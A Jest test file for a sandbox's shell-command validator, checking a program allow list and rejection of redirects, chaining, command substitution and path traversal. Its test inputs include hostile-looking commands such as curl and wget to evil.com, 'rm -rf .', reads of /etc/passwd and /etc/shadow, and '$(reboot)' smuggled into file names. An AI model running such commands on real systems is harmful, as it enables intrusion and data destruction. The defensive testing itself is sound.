/**
 * Tests for LocalSandboxService exec security.
 *
 * Instead of mocking child_process (complex due to promisify hoisting),
 * we test the exec logic by extracting and testing the validation patterns directly.
 */

jest.mock('@kodus/flow', () => ({
    createLogger: () => ({
        log: jest.fn(),
        error: jest.fn(),
        warn: jest.fn(),
        debug: jest.fn(),
        info: jest.fn(),
    }),
}));

/**
 * Extracted from LocalSandboxService.buildRemoteCommands.exec
 * to test validation logic without needing to mock child_process.
 */
function validateExecCommand(command: string): {
    allowed: boolean;
    reason?: string;
    program?: string;
    args?: string[];
} {
    const ALLOWED_PROGRAMS = new Set([
        'sg',
        'tsc',
        'npx',
        'eslint',
        'python',
        'python3',
        'go',
        'cargo',
        'cat',
        'wc',
        'head',
        'tail',
        'file',
        'grep',
    ]);

    if (!command.trim()) {
        return { allowed: false, reason: 'empty command' };
    }

    if (/`|\$\(/.test(command)) {
        return { allowed: false, reason: 'command substitution is not allowed' };
    }

    const outsideQuotes = command
        .replace(/"[^"]*"|'[^']*'/g, '')
        .replace(/\b2>&1\b/g, '');
    if (/(?:>>|<<|>|<|;|&&|\|\|)/.test(outsideQuotes)) {
        return { allowed: false, reason: 'unsupported shell syntax' };
    }

    const stages = command
        .split(/\|(?=(?:[^"']*(?:"[^"]*"|'[^']*'))*[^"']*$)/)
        .map((s) => s.trim())
        .filter(Boolean);

    let firstProgram: string | undefined;
    let firstArgs: string[] | undefined;
    for (const stage of stages) {
        const parts = stage.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) || [];
        if (parts.length === 0) {
            return { allowed: false, reason: 'empty command' };
        }
        const tokens = parts
            .map((p) => p.replace(/^['"]|['"]$/g, ''))
            .filter((t) => t !== '2>&1');
        const [program, ...args] = tokens;

        if (!ALLOWED_PROGRAMS.has(program)) {
            return {
                allowed: false,
                reason: `Program "${program}" is not allowed`,
                program,
            };
        }

        const hasTraversal = args.some(
            (a) => a.startsWith('/') || /(^|\/)\.\.($|\/)/.test(a),
        );
        if (hasTraversal) {
            return {
                allowed: false,
                reason: 'path traversal in args',
                program,
                args,
            };
        }

        if (!firstProgram) {
            firstProgram = program;
            firstArgs = args;
        }
    }

    return { allowed: true, program: firstProgram, args: firstArgs };
}

describe('LocalSandboxService exec validation', () => {
    describe('program whitelist', () => {
        it('should allow sg (ast-grep)', () => {
            const result = validateExecCommand(
                "sg --pattern '$VAR.map($FN)' --lang typescript .",
            );
            expect(result.allowed).toBe(true);
            expect(result.program).toBe('sg');
        });

        it('should allow npx', () => {
            const result = validateExecCommand('npx tsc --noEmit src/file.ts');
            expect(result.allowed).toBe(true);
            expect(result.program).toBe('npx');
            expect(result.args).toContain('tsc');
        });

        it('should allow eslint', () => {
            const result = validateExecCommand('eslint src/file.ts');
            expect(result.allowed).toBe(true);
        });

        it('should allow cat', () => {
            const result = validateExecCommand('cat src/file.ts');
            expect(result.allowed).toBe(true);
        });

        it('should allow tsc', () => {
            const result = validateExecCommand('tsc --noEmit');
            expect(result.allowed).toBe(true);
        });

        it('should allow go vet', () => {
            const result = validateExecCommand('go vet ./...');
            expect(result.allowed).toBe(true);
        });

        it('should allow cargo check', () => {
            const result = validateExecCommand('cargo check');
            expect(result.allowed).toBe(true);
        });

        it('should block curl', () => {
            const result = validateExecCommand('curl http://evil.com');
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('not allowed');
        });

        it('should block rm', () => {
            const result = validateExecCommand('rm -rf .');
            expect(result.allowed).toBe(false);
        });

        it('should block node', () => {
            const result = validateExecCommand('node -e "process.exit(1)"');
            expect(result.allowed).toBe(false);
        });

        it('should block bash', () => {
            const result = validateExecCommand('bash -c "whoami"');
            expect(result.allowed).toBe(false);
        });

        it('should block wget', () => {
            const result = validateExecCommand('wget http://evil.com');
            expect(result.allowed).toBe(false);
        });

        it('should block chmod', () => {
            const result = validateExecCommand('chmod 777 file');
            expect(result.allowed).toBe(false);
        });

        it('should block empty command', () => {
            const result = validateExecCommand('');
            expect(result.allowed).toBe(false);
        });
    });

    describe('path traversal protection', () => {
        it('should block absolute paths in positional args', () => {
            const result = validateExecCommand('cat /etc/passwd');
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('path traversal');
        });

        it('should block .. in positional args', () => {
            const result = validateExecCommand('cat ../../etc/passwd');
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('path traversal');
        });

        it('should block .. in middle of path', () => {
            const result = validateExecCommand(
                'eslint src/../../../etc/shadow',
            );
            expect(result.allowed).toBe(false);
        });

        it('should allow relative paths', () => {
            const result = validateExecCommand('cat src/utils/helper.ts');
            expect(result.allowed).toBe(true);
        });

        it('should allow nested relative paths', () => {
            const result = validateExecCommand(
                'eslint src/services/auth/handler.ts',
            );
            expect(result.allowed).toBe(true);
        });

        it('should allow flags containing slashes (not positional)', () => {
            const result = validateExecCommand(
                "sg --pattern 'import/export' --lang typescript .",
            );
            expect(result.allowed).toBe(true);
        });

        it('should allow flags containing .. (not positional)', () => {
            const result = validateExecCommand(
                "sg --pattern '$A..$B' --lang ruby .",
            );
            expect(result.allowed).toBe(true);
        });

        it('should allow dot path', () => {
            const result = validateExecCommand(
                'sg --pattern test --lang typescript .',
            );
            expect(result.allowed).toBe(true);
        });

        it('should block absolute path even with valid program', () => {
            const result = validateExecCommand('eslint /usr/src/app/secret.ts');
            expect(result.allowed).toBe(false);
        });

        it('should block traversal even with valid program', () => {
            const result = validateExecCommand('cat ../../../etc/shadow');
            expect(result.allowed).toBe(false);
        });
    });

    describe('edge cases', () => {
        it('should handle quoted arguments correctly', () => {
            const result = validateExecCommand(
                "sg --pattern 'await $PROMISE' --lang typescript src",
            );
            expect(result.allowed).toBe(true);
            expect(result.program).toBe('sg');
        });

        it('should handle double-quoted arguments', () => {
            const result = validateExecCommand(
                'sg --pattern "catch ($ERR) { }" --lang javascript .',
            );
            expect(result.allowed).toBe(true);
        });

        it('should handle multiple positional args', () => {
            const result = validateExecCommand(
                'eslint src/a.ts src/b.ts src/c.ts',
            );
            expect(result.allowed).toBe(true);
            expect(result.args).toHaveLength(3);
        });

        it('should block if ANY positional arg has traversal', () => {
            const result = validateExecCommand(
                'eslint src/ok.ts ../../bad.ts src/also-ok.ts',
            );
            expect(result.allowed).toBe(false);
        });
    });

    describe('pipeline support', () => {
        it('drops trailing 2>&1 and keeps the command valid', () => {
            const result = validateExecCommand('eslint src/file.ts 2>&1');
            expect(result.allowed).toBe(true);
            expect(result.program).toBe('eslint');
            expect(result.args).not.toContain('2>&1');
        });

        it('allows a whitelisted pipeline like cmd | head -N', () => {
            const result = validateExecCommand(
                'eslint src/file.ts 2>&1 | head -40',
            );
            expect(result.allowed).toBe(true);
            expect(result.program).toBe('eslint');
        });

        it('allows a grep filter stage in a pipeline', () => {
            const result = validateExecCommand(
                'go vet ./... 2>&1 | grep -v "Syntax OK" | head -20',
            );
            expect(result.allowed).toBe(true);
        });

        it('rejects an unknown program in a later pipeline stage', () => {
            const result = validateExecCommand(
                'eslint src/file.ts | awk "{print $1}"',
            );
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('not allowed');
        });

        it('rejects output redirect', () => {
            const result = validateExecCommand(
                'eslint src/file.ts > /tmp/out.log',
            );
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell syntax');
        });

        it('rejects command chaining with &&', () => {
            const result = validateExecCommand(
                'eslint src/a.ts && eslint src/b.ts',
            );
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell syntax');
        });

        it('rejects command substitution', () => {
            const result = validateExecCommand('cat $(echo /etc/passwd)');
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('command substitution');
        });

        it('rejects command substitution hidden inside double quotes', () => {
            const result = validateExecCommand('cat "file-$(reboot)"');
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('command substitution');
        });

        it('rejects command substitution hidden inside single quotes', () => {
            const result = validateExecCommand("cat 'file-$(reboot)'");
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('command substitution');
        });

        it('rejects backtick command substitution hidden inside quotes', () => {
            const result = validateExecCommand('cat "file-`reboot`"');
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('command substitution');
        });
    });
});
